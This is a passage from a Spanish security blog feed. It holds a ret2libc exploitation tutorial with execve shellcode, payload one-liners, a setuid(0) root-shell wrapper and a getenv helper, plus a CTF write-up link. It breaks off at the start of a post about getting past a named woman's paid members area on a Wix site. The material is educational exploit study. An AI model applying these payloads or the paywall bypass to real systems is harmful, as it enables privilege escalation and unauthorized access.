style="text-align: center;"><br /></div>&nbsp;Podemos observar que en la dirección de memoria: <b>0xffffd17c &nbsp;</b>aparecen parte de nuestros NOPs.<br /><br />Al final de nuestro payload colocaremos esta dirección de memoria respetando Little Endian:<br /><br /><pre class="brush: bash">python -c "print '\x90'*80+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'+'\x7c\xd1\xff\xff'"<br /></pre><br />Si enviamos nuestro payload nuevamente:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-ybI7FxwGn2Y/VlaVPuK498I/AAAAAAAAAuc/liEgyIZitjg/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A14%253A19.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="60" src="http://3.bp.blogspot.com/-ybI7FxwGn2Y/VlaVPuK498I/AAAAAAAAAuc/liEgyIZitjg/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A14%253A19.png" width="640" /></a></div><div style="text-align: center;"><br /></div><br /><b>QUE HA SUCEDIDO? POR QUE NO TENEMOS NUESTRA SHELL?</b><br /><br />Si compilamos el mismo programa desactivando la protección NX y enviamos el mismo payload, observamos que obtenemos nuestro preciado shell:<br /><br /><pre class="brush: bash">gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -ggdb -z execstack pwn.c -o pwn2<br /></pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-PjfBnXw_Pjc/VlaV1xC57eI/AAAAAAAAAuk/ciOj28P98JM/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A16%253A48.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="46" src="http://2.bp.blogspot.com/-PjfBnXw_Pjc/VlaV1xC57eI/AAAAAAAAAuk/ciOj28P98JM/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A16%253A48.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Esto se debe a que la protección NX está haciendo de las suyas y nos impide ejecutar código arbitrario alojado en el espacio de memoria ESP.<br /><br /></div><div style="text-align: center;"><b>Retomando el hilo principal de la entrada: Como saltamos la protección NX?</b></div><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;">Para lograr sortear esta protección, nos valdremos de funciones residentes en <b>libc </b>que estén por defecto marcadas como espacios de memoria ejecutable.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Un ejemplo es la función <a href="http://www.gnu.org/software/libc/manual/html_node/Running-a-Command.html">system()</a>&nbsp;de libc, la cual recibe como parámetro un <b>string </b>que posteriormente ejecuta:<br /><br />Siguiendo esta perspectiva nosotros trataremos de realizar desde nuestro payload una llamada a <b>system() </b>enviando como argumento <b>/bin/bash ( "system(/bin/bash)</b>" ).</div><div style="text-align: left;"><br /></div><div style="text-align: left;"></div><div style="text-align: center;"><b>Muy bien, en este punto debo haber captado su atención.</b></div><br />Otro punto a tener en cuenta es que al finalizar la llamada a la función <b>system()</b> nosotros debemos indicar hacia dónde debemos retornar, siendo ésta la dirección próxima funcional de nuestro binario, ya que de otra forma al finalizar <b>system(), EIP </b>no sabría hacia dónde continuar y el programa crashearía dejando logs en el sistema explotado.<br /><br />Como obtener una dirección de memoria próxima funcional suele ser bastante complejo teniendo en cuenta que el programa puede fallar en cualquier momento por la sobre escritura de variables, le dejaremos este trabajo a otra función de libc: <b>exit()</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">La función <b>exit()</b>&nbsp;realiza una salida limpia de la ejecución e inmediatamente realiza un <b>RET</b>&nbsp;hacia la ultima dirección de memoria válida con el fin de continuar el flujo de ejecución de un programa.<br /><br />Para dejarlo claro:<br /><br />Si el Programa A internamente llama a la ejecución del Programa B, al finalizar B (exit), retornará a la próxima linea funcional de A, para que A pueda por ej, utilizar el output de B para algún proceso propio.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Teniendo en cuenta esto nuestro nuevo payload quedaría de esta forma:<br /><br /><b></b><br /><pre class="brush: bash"><b>python -c "print 'nopsleed'+'system()'+'exit()'+'/bin/bash'"<br /></b></pre></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Por extraño que parezca, primero debemos indicar system(), luego la función de retorno, y al final el parámetro que ejecutará system().</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Obviamente <b>libc </b>al ser una librería del sistema se incluye por defecto al ejecutar un binario, y sus funciones pasan a ser punteros de memoria hacia dichas funciones.<br /><br />Dicho de otra forma system(), exit() y /bin/bash son direcciones de memoria que incluiremos en nuestro payload, dicho esto la pregunta lógica es:<br /><br /><div style="text-align: center;"><b>Como obtengo las direcciones de system() y exit()?</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Para esto nos ayudaremos de nuestro querido amigo gdb. Dado que las funciones de <b>libc </b>son importadas al momento de ejecución, lo primero que haremos es colocar un breakpoint en el cuerpo principal del binario:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-QBV_FzlR1ik/Vlafzkd0GSI/AAAAAAAAAu0/9i5DuVM-N4Y/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A59%253A25.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="46" src="http://1.bp.blogspot.com/-QBV_FzlR1ik/Vlafzkd0GSI/AAAAAAAAAu0/9i5DuVM-N4Y/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A59%253A25.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Luego de esto procedemos a ejecutar:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-R7zNUWhdlgo/VlagBLOnLyI/AAAAAAAAAu8/qGvFOo4e3Ro/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A00%253A26.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="126" src="http://1.bp.blogspot.com/-R7zNUWhdlgo/VlagBLOnLyI/AAAAAAAAAu8/qGvFOo4e3Ro/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A00%253A26.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">En este punto somos capaces de obtener la dirección de memoria de system() y de exit() colocando breakpoints o printeando los nombres de dichas funciones:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-3bD61ymfhhk/VlagYddvN2I/AAAAAAAAAvE/sWyYyNkmzNc/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A01%253A50.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="116" src="http://3.bp.blogspot.com/-3bD61ymfhhk/VlagYddvN2I/AAAAAAAAAvE/sWyYyNkmzNc/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A01%253A50.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Con esto podemos concluir que las direcciones de memoria correspondientes son:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b>system(): 0xf7e3e190</b></div><div style="text-align: left;"><b>exit(): &nbsp; &nbsp; &nbsp;0xf7e311e0</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Ahora sólo nos falta el parámetro que debe ejecutar <b>system(), éste es el paso más importante y por el cual mucha gente no termina de entender el funcionamiento de ret2libc</b>.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Siendo "/bin/bash" un string, nosotros debemos obtener el mismo desde algún lugar de memoria, sea este string parte del código del programa (cosa poco probable) o desde un puntero a una variable de entorno.<br /><br />Yo soy partidario de utilizar una variable customizada con el fin de inyectarla en tiempo de ejecución en el binario y poder utilizarla desde allí, a este procedimiento se le conoce como<b> EGGSTERING o EGG HUNTING</b>, por los famosos easter egg de distintos programas que utilizaban variables de entorno para validar y ejecutar mensajes ocultos o niveles superiores de administración.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Procederemos a crear nuestra variable de entorno:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-_-dw5OGm0PY/VlaimYPAcJI/AAAAAAAAAvM/iDRMBW0Yj94/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A11%253A22.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="62" src="http://2.bp.blogspot.com/-_-dw5OGm0PY/VlaimYPAcJI/AAAAAAAAAvM/iDRMBW0Yj94/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A11%253A22.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Una vez creada nuestra variable de entorno, procederemos a obtener su dirección de memoria desde gdb:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-ukb-PYoPLm8/VlajG1wi3RI/AAAAAAAAAvU/Ut9ldXeIHBg/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A13%253A27.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="160" src="http://3.bp.blogspot.com/-ukb-PYoPLm8/VlajG1wi3RI/AAAAAAAAAvU/Ut9ldXeIHBg/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A13%253A27.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">En este momento somos capaces de buscar en las variables de entorno inyectadas al binario en tiempo de ejecución.<br /><br />Las variables de entorno se encuentran finalizando la sección de ESP:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-1t-lXJPBx9A/Vlajg97FFXI/AAAAAAAAAvc/FD0WJGarZ7o/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A15%253A13.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="46" src="http://2.bp.blogspot.com/-1t-lXJPBx9A/Vlajg97FFXI/AAAAAAAAAvc/FD0WJGarZ7o/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A15%253A13.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Utilizamos <b>"s" </b>ya que las variables de entorno son del tipo string, y esto nos permite visualizar de forma correcta los strings dentro de un binario.</div><div style="text-align: left;">Continuamos hasta llegar a la zona:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-0II6-Kx95-I/VlakGC4QlgI/AAAAAAAAAvo/pZcPPDrhbX8/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A17%253A38.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="88" src="http://1.bp.blogspot.com/-0II6-Kx95-I/VlakGC4QlgI/AAAAAAAAAvo/pZcPPDrhbX8/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A17%253A38.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Como podemos observar nuestra variable EGG se encuentra en: <b>0xffffd417</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;"><b>Y he aquí el error de la mayoría! </b>Muchos utilizan esta dirección de memoria sin comprender que le estaremos pasando como parámetro a system(): EGG=/bin/bash<br /><br />Mejor dicho: <b>system(EGG=/bin/bash)</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">El comando EGG=/bin/bash, no existe, por lo que debemos enviar como parámetro de system() la porción de la variable de entorno que comience con<span style="color: red;"> </span><b><span style="color: red;">/ </span>(0x2f en hexa)</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Para obtener la dirección exacta de este caracter utilizamos gdb inspeccionando byte a byte la cadena alojada en: <b>0xffffd417 </b>hasta llegar al primer <b>0x2f</b></div><div style="text-align: left;"><b><br /></b></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-XqxxmVP7YYg/VlalrGt2rMI/AAAAAAAAAv0/_agsPzq0oIY/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A24%253A28.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="241" src="http://3.bp.blogspot.com/-XqxxmVP7YYg/VlalrGt2rMI/AAAAAAAAAv0/_agsPzq0oIY/s400/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A24%253A28.png" width="400" /></a></div><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;">En este paso obtenemos la dirección real de <b>/bin/bash: 0xffffd41b</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Ahora estamos listos para generar un payload <b>ret2libc </b>válido <b>para gdb:</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Ya que estamos trabajando con varias direcciones de memoria y esto hace factible que nos equivoquemos al convertir al Little Endian, dejaremos que python se ocupe de esto, haciendo uso de la librería struct, quedando nuestro payload:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><pre class="brush: py">python -c "import struct; print '\x90'*104+struct.pack('&lt;I', 0xf7e3e190)+struct.pack('&lt;I', 0xf7e311e0)+struct.pack('&lt;I', 0xffffd41b)<i 0xf7e311e0="" 0xf7e3e190="" 0xffffd41b="" pre="" struct.pack=""><br /></i></pre></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b>El resultado:</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-vhXRo7KDPkk/VlaramG7PCI/AAAAAAAAAwE/P3cJEkJWvQ8/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A48%253A43.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="28" src="http://4.bp.blogspot.com/-vhXRo7KDPkk/VlaramG7PCI/AAAAAAAAAwE/P3cJEkJWvQ8/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A48%253A43.png" width="640" /></a></div><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;">Obtenemos de forma correcta nuestra shell saltando la protección NX.</div><div style="text-align: left;"><br /><div style="text-align: center;"><b>Pero... por qué nuestra shell no corre con permisos de root?</b></div><b><br /></b>Esto ocurre ya que la función system() dropea los privilegios de SUID, system ejecuta un comando como si nosotros lo hicieramos por medio de la terminal /bin/bash, y al detectar la creación de un proceso hijo, dropea los permisos como una medida de seguridad.<br /><br />Para lograr bypassear esta protección existen 2 tecnicas:<br /><br />1) Crear un binario intermediario que nos devuelva los permisos de root y lance por medio de una función sin protecciones nuestra shell.<br /><br />2) No utilizar system() y utilizar una función sin protecciones para lanzar nuestra shell.<br /><br />En ambos casos utilizaremos la función execve(), la diferencia radica en que si seguimos por el camino número 2, deberemos escapear de forma correcta todos los argumentos requeridos por execve desde ASM y esto se vuelve algo tedioso si nos encontramos con badchars.<br /><br />En el primer caso (del cual trata esta entrada), escribiremos un pequeño programa que canalizará la ejecución de execv() por medio de C trabajando de esta manera a más alto nivel y por consecuencia de una forma más legible.<br /><br />Lo primero que debemos hacer es obtener nuevamente nuestros permisos de root, esto lo logramos con:<br /><br /><b>setuid(0) y setgid(0)</b><br /><br />quedando nuestro código de la siguiente forma:<br /><br /><pre class="brush: cpp">//wrapper.c</pre><pre class="brush: cpp">#include &lt;stdio.h&gt;<br />#include &lt;string.h&gt;<br /><br />int main ()<br />{<br /><br />   setuid(0);<br />   setgid(0);<br />   execve("/bin/sh", NULL, NULL);<br /><br />   return(0);<br />}</pre><br />Compilamos y obtenemos nuestro binario con <b>gcc wrapper.c -o wrapper</b>&nbsp;y al ejecutarlo observamos cómo esto nos devuelve una shell sin privilegios.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-RpTLyIZJQcc/VnRrJtg0zUI/AAAAAAAAAwU/SG8qGXnYXHY/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A22%253A35.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="30" src="http://4.bp.blogspot.com/-RpTLyIZJQcc/VnRrJtg0zUI/AAAAAAAAAwU/SG8qGXnYXHY/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A22%253A35.png" width="640" /></a></div><br /><b><br /></b></div><div style="text-align: right;"><div style="text-align: left;"></div><div style="text-align: center;"><b>Dónde esta el secreto de todo esto? Cómo obtendremos permisos de root?</b></div><br /><br /><div style="text-align: left;">Desde nuestro binario vulnerable, el cual tiene el bit SUID activo, llamaremos por medio de system() a nuestro <b>wrapper</b>, <b>system()</b> dropeará nuestros privilegios, pero al ejecutar <b>wrapper </b>con el bit SUID, éste <b>momentáneamente</b> tendrá permisos para ejecutar <b>setuid(0)</b> y <b>setgrp(0)</b> volviendo a elevar sus privilegios y lanzando con <b>execv()</b> nuestra shell, pero ahora con permisos de <b>root!</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Para lograr esto, seguiremos el proceso de explotación de ret2libc, pero en nuestra variable de entorno realizaremos un llamado a nuestro binario intermedio: <b>wrapper</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;"><b></b></div><div style="text-align: left;"><b>$ export EGG='./wrapper'</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Seguido a esto, buscaremos realizar la explotación por fuera de gdb, dado que gdb encapsula la ejecución y es poco probable que logremos obtener una shell root.<br /><br />Dado que <b>ASLR </b>esta desactivado, las direcciones de memoria de system() y de exit() se mantendrán, pero la dirección de nuestra variable de entorno cambiará, para obtenerla nos ayudaremos de la función <b>getenv() </b>de C.<br /><br />Código:</div><div style="text-align: left;"><br /></div><pre class="brush: cpp" style="text-align: left;">//getenv.c</pre><pre class="brush: cpp" style="text-align: left;">#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br /><br />int main(int argc, char *argv[]) {<br /><br />if(argc &lt; 2) {<br />printf("Usage: %s &lt;environ_var&gt;\n", argv[0]);<br />exit(-1);<br />}<br /><br />char *addr_ptr;<br /><br />addr_ptr = getenv(argv[1]);<br /><br />if(addr_ptr == NULL) {<br />printf("Environmental variable %s does not exist!\n", argv[1]);<br />exit(-1);<br />}<br /><br />printf("%s is stored at address %p\n", argv[1], addr_ptr);<br />return(0);<br />}</pre><div style="text-align: left;"><br />Compilamos el código (<b>gcc getenv.c -o getenv</b>) y ejecutamos <b>getenv </b>pasando como parámetro el nombre de nuestra variable de entorno:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-_wGZUPtJL2g/VnRutyTuVVI/AAAAAAAAAwg/0B3yU7tsSSo/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A38%253A01.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="26" src="http://3.bp.blogspot.com/-_wGZUPtJL2g/VnRutyTuVVI/AAAAAAAAAwg/0B3yU7tsSSo/s320/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A38%253A01.png" width="320" /></a></div><br /><div style="text-align: left;">La variable de entorno se encuentra alojada en el espacio de memoria:&nbsp;<b>0x7fffffffe43f</b></div><div style="text-align: left;"><b>Ésta dirección se debe a que mi arquitectura de procesador es x64, </b>pero sabiendo que <b>x86</b> se rige por los últimos 4 bytes podemos deducir que cerca de la dirección: <b>0xffffe43f </b>se encontrará nuestro llamado a <b>wrapper</b>.</div><div class="separator" style="clear: both; text-align: center;"><br /></div><div style="text-align: left;">Jugamos un poco con la dirección en nuestro payload moviéndonos algunos bites hasta obtener salidas que nos indiquen si estamos cerca:<br /><br />Dirección original: Nada!</div><div style="text-align: left;"><br /></div><div style="text-align: center;"><a href="http://4.bp.blogspot.com/-7fbJtjqdDmc/VnRw9NpA6jI/AAAAAAAAAws/_0FOWEvagEg/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A47%253A36.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="16" src="http://4.bp.blogspot.com/-7fbJtjqdDmc/VnRw9NpA6jI/AAAAAAAAAws/_0FOWEvagEg/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A47%253A36.png" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Primer desplazamiento:&nbsp;<b>0xffffe43f -&gt;&nbsp;0xffffd43f</b></div><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-syc0_PMDGjs/VnRxmVG8i9I/AAAAAAAAAw0/_YTTRbLFbbw/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A49%253A38.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="22" src="http://4.bp.blogspot.com/-syc0_PMDGjs/VnRxmVG8i9I/AAAAAAAAAw0/_YTTRbLFbbw/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A49%253A38.png" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Respuesta: <b>command not found!</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">En este punto debemos estar cerca de la zona de strings, comenzamos a desplazarnos byte por byte hasta llegar a la dirección de memoria correcta:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-JpRnJ6j48PQ/VnRyGscgtuI/AAAAAAAAAw8/uwVUwi5UU6U/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A51%253A56.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="38" src="http://3.bp.blogspot.com/-JpRnJ6j48PQ/VnRyGscgtuI/AAAAAAAAAw8/uwVUwi5UU6U/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A51%253A56.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"></div><div style="text-align: center;"><b>BUM! nuestra shell root spawneada!</b></div><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;"><b>Espero que esta entrada les haya sido de utilidad a todos aquellos aventureros al mundo del exploiting, próximamente trataremos bypass de stack canaries.</b><br /><div style="text-align: center;"><b><b>Estoy abierto a críticas y sugerencias, gracias por su tiempo!</b></b></div><b></b></div><br /><br /><b>Saludos!</b></div></div></div></div></div></div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[EkoParty Pre CTF ]]></title>
    <link href="http://securitysignal.github.io/blog/2015/09/30/eko-party-pre-ctf/"/>
    <updated>2015-09-30T17:54:00-07:00</updated>
    <id>http://securitysignal.github.io/blog/2015/09/30/eko-party-pre-ctf</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-eKEy3q8WTpY/VgyBAJ0mpsI/AAAAAAAAAss/pOpMg7OGdYY/s1600/ekoparty-logo.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="320" src="http://1.bp.blogspot.com/-eKEy3q8WTpY/VgyBAJ0mpsI/AAAAAAAAAss/pOpMg7OGdYY/s320/ekoparty-logo.png" width="320" /></a></div>Este mes tuvimos el agrado de participar en el PRE CTF del gran evento <b>"EKOPARTY"</b>, quedando rankeados en el puesto <b>#34</b>&nbsp;de <b>655 </b>competidores a nivel mundial.<br /><a name='more'></a><br /><br />Logramos sumar 1175 puntos de un máximo de 1875, esto deja claro que no fuimos capaces de superar todos los retos, pero de todas formas queremos compartir nuestras soluciones con Uds.<br /><br />Espero sea una lectura de su agrado ya que tratamos de ser lo mas detallados posibles al escribir este WriteUp. (Por un detalle técnico de los organizadores del CTF no contamos con los servidores web activos al momento de escribir el solucionario, por lo cual los items WEB no quedaron tan detallados como hubiésemos querido.)<br /><br />Descargar pdf:<br /><a href="https://mega.nz/#!JsRH0YAZ!GhueJpQWUwyZMj_LurCNqRzA7UxyHp717zF1CCZCOYI">https://mega.nz/#!JsRH0YAZ!GhueJpQWUwyZMj_LurCNqRzA7UxyHp717zF1CCZCOYI</a><br /><br />Material de los Retos: (Actualización 01/10/2015)<br /><a href="https://mega.nz/#!15hEwBJC!WPkEBUSCl9rrCUDo0Kh204RLAwQzAP56qzxJOhlvFXw">https://mega.nz/#!15hEwBJC!WPkEBUSCl9rrCUDo0Kh204RLAwQzAP56qzxJOhlvFXw&nbsp;</a><br /><br /><iframe height="1000px" src="https://docs.google.com/document/d/1JObgNONg9Gz1xR5TG89L4Lfk3stpMGJgrwnyjpCneuE/pub?embedded=true" width="100%"></iframe>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Esquivando la seguridad de WIX.COM]]></title>
    <link href="http://securitysignal.github.io/blog/2015/07/18/esquivando-la-seguridad-de-wixcom/"/>
    <updated>2015-07-18T09:45:00-07:00</updated>
    <id>http://securitysignal.github.io/blog/2015/07/18/esquivando-la-seguridad-de-wixcom</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-eW5K-WFkMiA/VapmcCy4XUI/AAAAAAAAAqE/oYACvkmRGoU/s1600/wix.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="363" src="http://2.bp.blogspot.com/-eW5K-WFkMiA/VapmcCy4XUI/AAAAAAAAAqE/oYACvkmRGoU/s640/wix.jpg" width="640" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Buen dia queridos lectores, antes de iniciar esta entrada, quiero pedirles disculpas por estar un largo<br />periodo inactivo, mis responsabilidades laborales<br /><a name='more'></a> incrementaron y no he logrado hacerme un tiempo para traerles algo de calidad.<br /><br />Como introducción quiero contarles que he estado trabajando en varios proyectos en javascript (Node.js y Angular.js), esto conlleva dividir el ambiente de trabajo en 2 partes (Backend y FrontEnd) que se comunican por medio de un API.<br /><br />Este API utiliza como en capa de transporte el famoso formato JSON (JavaScript Object Notation), el cual solo permite ser cifrado por SSL ya que para comunicarnos debidamente necesitamos establecer en el HEADER HTTP el <b>Content-Type: application/json </b>y al cifrarlo de alguna manera rompemos la estructura de comunicación&nbsp;<b>json </b>al transmitir texto plano encryptado.<b>&nbsp;</b><br /><br />La solución obvia era generar un certificado SSL, y pagarle a un CA autorizado para que firmara de confianza mi certificado, lo cual no era una opción ya que el ambiente aun esta en desarrollo.<br /><br />La siguiente alternativa era crear mi propio servidor CA, firmar el certificado y colocar mi CA en el circulo de confianza de las maquinas de desarrollo.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Ninguna de estas opciones me convencía, por lo cual decidí crear un middleware en nodejs, que capturara todos los request encriptados del cliente (browser) y les pasara una funcion propia de desencriptación y convertir el string nuevamente a un objeto json.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">De esta forma al llegar la solicitud al controllador correspondiente lo manejaría de forma transparente como si el objeto JSON nunca hubiera sido encriptado.<br /><br />Luego de resolver este problema de comunicación decidí distraerme un poco, encendí un cigarrillo &nbsp;y comencé a leer un poco sobre las Artes Marciales Mixtas (MMA).</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Lo curioso de esto es que llegue a un sitio web de una profesora de MMA de Buenos Aires, Argentina por medio de un video en youtube donde mostraba un poco como eran sus entrenamientos.</div><div style="text-align: left;"><br /></div><div style="text-align: center;">&nbsp;<b>....En este punto se preguntaran... que tiene que ver las APIs con el MMA....</b></div><div style="text-align: center;"><b>(paciencia)</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">El sitio al cual llegue es:&nbsp;<a href="http://www.pamelagaldos.com.ar/">http://www.pamelagaldos.com.ar/</a></div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-EM6x1s9MpPk/VaprhwYcbqI/AAAAAAAAAqU/5pJDVqpyn1o/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A06%253A22.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="356" src="http://3.bp.blogspot.com/-EM6x1s9MpPk/VaprhwYcbqI/AAAAAAAAAqU/5pJDVqpyn1o/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A06%253A22.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Luego de ver algunos de sus videos en importantes campeonatos de MMA en Bs As. note que <b>Pamela tiene un problema...</b> oculta algo...<br /><br />El sitio posee una <b>ZONA VIP </b>la cual solicita una contraseña para poder visualizar una galeria <b>especial </b>de imagenes y videos. Para adquirir esa contraseña, la señórita <b>Galdos </b>solicita una donación por mercadopago de 100$&nbsp;<b>(pregunta retorica... una donación no es lo que uno quiere donar? parece que no... ahora las donaciones tienen monto fijo!)&nbsp;</b></div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-dKqFaxgBfag/VapuB8FiEFI/AAAAAAAAAqw/8KR1bWrIOVw/s1600/ee.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="428" src="http://1.bp.blogspot.com/-dKqFaxgBfag/VapuB8FiEFI/AAAAAAAAAqw/8KR1bWrIOVw/s640/ee.png" width="640" 